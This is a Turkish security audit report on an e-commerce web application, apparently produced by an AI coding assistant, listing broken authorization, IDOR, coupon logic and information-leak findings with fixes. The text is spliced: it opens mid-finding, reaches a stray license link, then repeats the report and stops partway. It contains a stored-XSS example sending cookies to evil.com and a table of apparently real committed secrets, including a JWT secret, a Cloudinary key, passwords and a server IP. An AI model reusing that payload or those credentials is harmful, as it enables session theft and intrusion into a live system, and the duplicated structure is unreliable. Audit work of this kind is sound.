**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        ],
    }];
}
```


## License: unknown
https://github.com/praveenjuge/praveenjuge/blob/f7c607592efe59257f18e3337868dd9519bec159/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
